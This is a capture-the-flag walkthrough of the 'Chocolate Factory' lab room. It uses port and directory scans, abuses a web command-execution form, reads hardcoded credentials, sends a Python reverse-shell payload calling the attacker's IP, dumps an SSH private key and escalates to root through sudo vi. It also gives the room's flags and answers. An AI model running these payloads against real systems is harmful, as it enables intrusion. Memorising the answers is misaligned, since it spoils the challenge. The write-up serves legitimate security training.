# Chocolate Factory

Welcome to Willy Wonka's Chocolate Factory!

This room was designed so that hackers can revisit the Willy Wonka's Chocolate Factory and meet Oompa Loompa.

This is a beginner friendly room!

If you have any issues / queries you can reach us through Discord or Twitter.

( Created by AndyInfosec team for the community! )

# Enter the key you found!

## Initial foothold

Several services are exposed, including FTP, SSH and HTTP. Other services are hosted on ports 100, 106, 109, 110, ... but we won't need them.

~~~
PORT    STATE SERVICE    VERSION
21/tcp  open  ftp        vsftpd 3.0.3
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.50.72
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| ssh-hostkey: 
|   2048 16:31:bb:b5:1f:cc:cc:12:14:8f:f0:d8:33:b0:08:9b (RSA)
|   256 e7:1f:c9:db:3e:aa:44:b6:72:10:3c:ee:db:1d:33:90 (ECDSA)
|_  256 b4:45:02:b6:24:8e:a9:06:5f:6c:79:44:8a:06:55:5e (ED25519)
80/tcp  open  http       Apache httpd 2.4.29 ((Ubuntu))
|_auth-owners: ERROR: Script execution failed (use -d to debug)
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
100/tcp open  newacct?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
106/tcp open  pop3pw?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"

[REDACTED]

~~~

## Web

An enumeration of the web directories allows to quickly discover interesting files:

~~~
kali@kali:/data/vpn$ gobuster dir -u http://10.10.241.245 -x php,txt,tar,zip,old,bak -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.241.245
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,tar,zip,old,bak,php
[+] Timeout:        10s
===============================================================
2021/04/27 13:15:03 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.txt (Status: 403)
/.htaccess.tar (Status: 403)
/.htaccess.zip (Status: 403)
/.htaccess.old (Status: 403)
/.htaccess.bak (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.txt (Status: 403)
/.htpasswd.tar (Status: 403)
/.htpasswd.zip (Status: 403)
/.htpasswd.old (Status: 403)
/.htpasswd.bak (Status: 403)
/.htpasswd.php (Status: 403)
/.hta (Status: 403)
/.hta.php (Status: 403)
/.hta.txt (Status: 403)
/.hta.tar (Status: 403)
/.hta.zip (Status: 403)
/.hta.old (Status: 403)
/.hta.bak (Status: 403)
/home.php (Status: 200)
/index.html (Status: 200)
/index.php.bak (Status: 200)
/server-status (Status: 403)
===============================================================
2021/04/27 13:18:48 Finished
===============================================================
~~~

The most promising file is obviously `home.php` as it allows to execute commands:

~~~
kali@kali:/data/Chocolate_Factory/files$ curl -s -XPOST -d "command=ls%20-l" http://10.10.241.245/home.php
<html>
<head>
	<title></title>
	<style type="text/css">
		.cmd{
			position: absolute;
			margin-top: 5%;
			margin-left: 40%;
		}
		body{
			background-image: url(home.jpg);
			height: 90vh;
			background-size: cover;
			background-position: center;
		}
		input[type="text"],select{
			padding: 5px;
		}
		button{
			padding: 5px;
		}
	</style>
</head>
<body>
<div class="cmd">
	<form method="POST">
    	<input id="comm" type="text" name="command" placeholder="Command">
    	<button>Execute</button>
    </form>
</form>
total 1132
-rw-rw-r-- 1 charlie charley   65719 Sep 30  2020 home.jpg
-rw-rw-r-- 1 charlie charley     695 Sep 30  2020 home.php
-rw-rw-r-- 1 charlie charley 1060347 Sep 30  2020 image.png
-rw-rw-r-- 1 charlie charley    1466 Oct  1  2020 index.html
-rw-rw-r-- 1 charlie charley     273 Sep 29  2020 index.php.bak
-rw-r--r-- 1 charlie charley    8496 Sep 30  2020 key_rev_key
-rw-rw-r-- 1 charlie charley     303 Sep 30  2020 validate.php
</body>
</html>
~~~

## The `key_rev_key` file

Let's download the `key_rev_key` file. This is an executable that prompts for a name. If it is incorrect, it will fail giving you the key. Just using strings, we can get the expected name.

~~~
kali@kali:/data/Chocolate_Factory/files$ strings key_rev_key 

[REDACTED]

Enter your name: 
laksdhfas
 congratulations you have found the key:   
b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
 Keep its safe
Bad name!

[REDACTED]

~~~

Let's try:

~~~
kali@kali:/data/Chocolate_Factory/files$ ./key_rev_key 
Enter your name: laksdhfas

 congratulations you have found the key:   b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
~~~

key: `b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='`


# What is Charlie's password?

Still exploiting the same command execution form, we can now dump the content of `validate.php` which discloses credentials:

```php
kali@kali:/data/Chocolate_Factory/files$ files$ curl -s -XPOST -d "command=cat%20validate.php" http://10.10.241.245/h<html>p 
<head>
  <title></title>
  <style type="text/css">
    .cmd{
      position: absolute;
      margin-top: 5%;
      margin-left: 40%;
    }
    body{
      background-image: url(home.jpg);
      height: 90vh;
      background-size: cover;
      background-position: center;
    }
    input[type="text"],select{
      padding: 5px;
    }
    button{
      padding: 5px;
    }
  </style>
</head>
<body>
<div class="cmd">
  <form method="POST">
      <input id="comm" type="text" name="command" placeholder="Command">
      <button>Execute</button>
    </form>
</form>
<?php
  $uname=$_POST['uname'];
  $password=$_POST['password'];
  if($uname=="charlie" && $password=="cn7824"){
    echo "<script>window.location='home.php'</script>";
  }
  else{
    echo "<script>alert('Incorrect Credentials');</script>";
    echo "<script>window.location='index.html'</script>";
  }
?></body>
</html>
```

Answer: `cn7824`


# Enter the user flag

## Reverse shell

Let's intercept the request in Burp Suite and send the following request:

~~~
POST /home.php HTTP/1.1
Host: 10.10.241.245
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.241.245/home.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 48
Connection: close
Upgrade-Insecure-Requests: 1

command=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.50.72",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
~~~

We now have a reverse shell:

~~~
kali@kali:/data/Chocolate_Factory/files$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.8.50.72] from (UNKNOWN) [10.10.241.245] 43514
bash: cannot set terminal process group (1015): Inappropriate ioctl for device
bash: no job control in this shell
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

www-data@chocolate-factory:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data),0(root),27(sudo)
~~~

## SSH private key

In Charlie's home folder, there is a file named `teleport` which corresponds to his SSH private key:

~~~
www-data@chocolate-factory:/home/charlie$ cat teleport
cat teleport
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA4adrPc3Uh98RYDrZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW
1AzL12K35/Mi3Vwtp0NSwmlS7ha4y9sv2kPXv8lFOmLi1FV2hqlQPLw/unnEFwUb
L4KBqBemIDefV5pxMmCqqguJXIkzklAIXNYhfxLr8cBS/HJoh/7qmLqrDoXNhwYj
B3zgov7RUtk15Jv11D0Itsyr54pvYhCQgdoorU7l42EZJayIomHKon1jkofd1/oY
fOBwgz6JOlNH1jFJoyIZg2OmEhnSjUltZ9mSzmQyv3M4AORQo3ZeLb+zbnSJycEE
RaObPlb0dRy3KoN79lt+dh+jSg/dM/TYYe5L4wIDAQABAoIBAD2TzjQDYyfgu4Ej
Di32Kx+Ea7qgMy5XebfQYquCpUjLhK+GSBt9knKoQb9OHgmCCgNG3+Klkzfdg3g9
zAUn1kxDxFx2d6ex2rJMqdSpGkrsx5HwlsaUOoWATpkkFJt3TcSNlITquQVDe4tF
w8JxvJpMs445CWxSXCwgaCxdZCiF33C0CtVw6zvOdF6MoOimVZf36UkXI2FmdZFl
kR7MGsagAwRn1moCvQ7lNpYcqDDNf6jKnx5Sk83R5bVAAjV6ktZ9uEN8NItM/ppZ
j4PM6/IIPw2jQ8WzUoi/JG7aXJnBE4bm53qo2B4oVu3PihZ7tKkLZq3Oclrrkbn2
EY0ndcECgYEA/29MMD3FEYcMCy+KQfEU2h9manqQmRMDDaBHkajq20KvGvnT1U/T
RcbPNBaQMoSj6YrVhvgy3xtEdEHHBJO5qnq8TsLaSovQZxDifaGTaLaWgswc0biF
uAKE2uKcpVCTSewbJyNewwTljhV9mMyn/piAtRlGXkzeyZ9/muZdtesCgYEA4idA
KuEj2FE7M+MM/+ZeiZvLjKSNbiYYUPuDcsoWYxQCp0q8HmtjyAQizKo6DlXIPCCQ
RZSvmU1T3nk9MoTgDjkNO1xxbF2N7ihnBkHjOffod+zkNQbvzIDa4Q2owpeHZL19
znQV98mrRaYDb5YsaEj0YoKfb8xhZJPyEb+v6+kCgYAZwE+vAVsvtCyrqARJN5PB
la7Oh0Kym+8P3Zu5fI0Iw8VBc/Q+KgkDnNJgzvGElkisD7oNHFKMmYQiMEtvE7GB
FVSMoCo/n67H5TTgM3zX7qhn0UoKfo7EiUR5iKUAKYpfxnTKUk+IW6ME2vfJgsBg
82DuYPjuItPHAdRselLyNwKBgH77Rv5Ml9HYGoPR0vTEpwRhI/N+WaMlZLXj4zTK
37MWAz9nqSTza31dRSTh1+NAq0OHjTpkeAx97L+YF5KMJToXMqTIDS+pgA3fRamv
ySQ9XJwpuSFFGdQb7co73ywT5QPdmgwYBlWxOKfMxVUcXybW/9FoQpmFipHsuBjb
Jq4xAoGBAIQnMPLpKqBk/ZV+HXmdJYSrf2MACWwL4pQO9bQUeta0rZA6iQwvLrkM
Qxg3lN2/1dnebKK5lEd2qFP1WLQUJqypo5TznXQ7tv0Uuw7o0cy5XNMFVwn/BqQm
G2QwOAGbsQHcI0P19XgHTOB7Dm69rP9j1wIRBOF7iGfwhWdi+vln
-----END RSA PRIVATE KEY-----
~~~

## User flag

Now in Kali, save the key as `ssh.key` and connect via SSH to get the user flag:

~~~
kali@kali:/data/Chocolate_Factory/files$ chmod 600 ssh.key 
kali@kali:/data/Chocolate_Factory/files$ ssh -i ssh.key charlie@10.10.241.245
charlie@chocolate-factory:/$ cd /home/charlie
charlie@chocolate-factory:/home/charlie$ cat user.txt
flag{cd5509042371b34e4826e4838b522d2e}
~~~

User flag: `flag{cd5509042371b34e4826e4838b522d2e}`

# Enter the root flag

Charlie can execute `vi` with `sudo`:

~~~
charlie@chocolate-factory:/home/charlie$ sudo -l
Matching Defaults entries for charlie on chocolate-factory:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User charlie may run the following commands on chocolate-factory:
    (ALL : !root) NOPASSWD: /usr/bin/vi
~~~

To get a root shell, we'll send a command to `vi` as follows:

~~~
charlie@chocolate-factory:/home/charlie$ sudo /usr/bin/vi -c ':!/bin/bash' /dev/null 

root@chocolate-factory:/home/charlie# id
uid=0(root) gid=0(root) groups=0(root)
~~~

Now with a root shell, let's get the flag:

~~~
root@chocolate-factory:/home/charlie# cd /root
root@chocolate-factory:/root# ls -la
total 40
drwx------  6 root    root    4096 Oct  7  2020 .
drwxr-xr-x 24 root    root    4096 Sep  1  2020 ..
-rw-------  1 root    root       0 Oct  7  2020 .bash_history
-rw-r--r--  1 root    root    3106 Apr  9  2018 .bashrc
drwx------  3 root    root    4096 Oct  1  2020 .cache
drwx------  3 root    root    4096 Sep 30  2020 .gnupg
drwxr-xr-x  3 root    root    4096 Sep 29  2020 .local
-rw-r--r--  1 root    root     148 Aug 17  2015 .profile
-rwxr-xr-x  1 charlie charley  491 Oct  1  2020 root.py
-rw-r--r--  1 root    root      66 Sep 30  2020 .selected_editor
drwx------  2 root    root    4096 Sep  1  2020 .ssh
root@chocolate-factory:/root# python root.py 
Enter the key:  b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
__   __               _               _   _                 _____ _          
\ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___ 
 \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
  | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
  |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|
                                                                             
  ___                              ___   __  
 / _ \__      ___ __   ___ _ __   / _ \ / _| 
| | | \ \ /\ / / '_ \ / _ \ '__| | | | | |_  
| |_| |\ V  V /| | | |  __/ |    | |_| |  _| 
 \___/  \_/\_/ |_| |_|\___|_|     \___/|_|   
                                             

  ____ _                     _       _       
 / ___| |__   ___   ___ ___ | | __ _| |_ ___ 
| |   | '_ \ / _ \ / __/ _ \| |/ _` | __/ _ \
| |___| | | | (_) | (_| (_) | | (_| | ||  __/
 \____|_| |_|\___/ \___\___/|_|\__,_|\__\___|
                                             
 _____          _                    
|  ___|_ _  ___| |_ ___  _ __ _   _  
| |_ / _` |/ __| __/ _ \| '__| | | | 
|  _| (_| | (__| || (_) | |  | |_| | 
|_|  \__,_|\___|\__\___/|_|   \__, | 
                              |___/  

flag{cec59161d338fef787fcb4e296b42124}
~~~

Root flag: `flag{cec59161d338fef787fcb4e296b42124}`
